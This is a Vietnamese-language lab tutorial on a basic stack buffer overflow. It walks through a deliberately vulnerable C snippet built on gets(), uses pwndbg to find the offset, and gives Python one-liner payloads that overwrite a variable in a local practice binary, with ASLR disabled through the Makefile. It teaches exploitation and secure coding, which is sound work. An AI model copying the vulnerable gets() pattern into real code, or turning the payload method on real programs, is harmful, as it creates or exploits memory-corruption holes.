# Bai 1: Buffer Overflow co ban

Muc tieu bai nay: hieu duoc tran bo dem tren stack, xem vi tri bien bang `pwndbg`, va tao payload de ghi de bien `secret`.

## 1) Source loi

```c
int secret;
char name[100];
gets(name);
if (secret == 0x746f6f72) {
    printf("You win!\\n");
}
```

- `gets(name)` doc input khong gioi han do dai.
- `name` chi co 100 byte, neu nhap dai hon thi du lieu se tran sang cac vung ben canh tren stack.
- Muc tieu la ghi de `secret` thanh `0x746f6f72`.

`0x746f6f72` theo byte little-endian la: `72 6f 6f 74` => chuoi `root`.

## 2) Hinh dung stack frame

Stack frame cua `main` (don gian hoa):

```text
Dia chi cao
+-------------------+
| saved RIP / RET   |
+-------------------+
| saved RBP         |
+-------------------+
| secret (4 byte)   |  <== muon ghi vao day
+-------------------+
| name[100]         |  <== gets() ghi tu day
+-------------------+
Dia chi thap
```

Stack tang xuong duoi (ve dia chi thap). Khi input vuot qua 100 byte cua `name`, no se ghi tiep vao `secret`, roi toi saved frame pointer/return address.

## 3) Build binary

```bash
make
```

Tao ra:
- `target_m32`
- `target_m64`

Luu y:
- `Makefile` co dong `echo 0 > /proc/sys/kernel/randomize_va_space` de tat ASLR. Dong nay thuong can quyen root.
- Neu khong tat duoc ASLR thi van hoc duoc overflow bien cuc bo, chi la dia chi khi debug co the thay doi.

## 4) Xem stack bang pwndbg

### 4.1 Chay gdb

```bash
gdb -q ./target_m64
```

Trong `gdb`/`pwndbg`:

```gdb
break main
run
next        # di qua den gan gets
p &name
p &secret
```

Hai lenh quan trong:
- `p &name`: dia chi bat dau bo dem.
- `p &secret`: dia chi bien can ghi de.

Tinh offset:

```gdb
p/d (long)&secret - (long)&name
```

Neu ket qua la `108`, nghia la can 108 byte rac + 4 byte gia tri `root`.

### 4.2 Nhin truc tiep bo nho stack

```gdb
x/40gx $rsp      # 64-bit
# hoac
x/80wx $esp      # 32-bit
```

Mot so lenh pwndbg huu ich:
- `stack 30`: in nhanh 30 dong stack.
- `telescope $rsp 20`: xem stack de doc.
- `context`: xem tong hop thanh ghi + stack + code moi lan step.

## 5) Tao payload exploit

### m64

Offset thu duoc: 108 byte.

```bash
python3 -c 'print("A"*108 + "root")' > payload_m64
./target_m64 < payload_m64
```

Ky vong:

```text
Enter your name: You win!
```

### m32

Offset thu duoc: 100 byte.

```bash
python3 -c 'print("A"*100 + "root")' > payload_m32
./target_m32 < payload_m32
```

Ky vong:

```text
Enter your name: You win!
```

## 6) Quy trinh exploit can nho

1. Tim cho nhap lieu nguy hiem (`gets`, `scanf("%s")`, `strcpy`, ...).
2. Xac dinh bien buffer va bien muc tieu tren stack (`p &buffer`, `p &target`).
3. Tinh offset giua 2 dia chi.
4. Tao payload: `padding + gia tri can ghi`.
5. Chay thu va quan sat stack de xac nhan.

## 7) Bai hoc rut ra

- Buffer overflow khong chi de hijack RET, ma con co the doi gia tri bien logic nhu `secret`.
- `gets()` la ham nguy hiem, khong nen dung.
- Luon dung ham co gioi han do dai (`fgets`, `snprintf`, `strncpy` dung cach).
